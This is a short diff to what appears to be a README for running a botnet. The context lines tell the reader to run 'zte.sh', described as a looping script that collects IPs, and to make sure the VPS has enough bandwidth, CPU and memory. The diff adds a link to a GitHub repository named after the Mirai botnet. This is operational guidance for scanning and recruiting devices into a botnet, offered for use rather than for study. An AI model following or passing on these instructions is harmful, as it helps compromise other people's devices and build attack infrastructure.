@@ -224,3 +224,5 @@ sh zte.sh
 ------------------------------------------------------------------------------------------------------------------
 zte.sh It's an automatic loop file. OK, now it's collecting IP
 Make sure you have enough VPS bandwidth, CPU and memory
+
+https://github.com/goodman-xh/Unstable-botnet-mirai
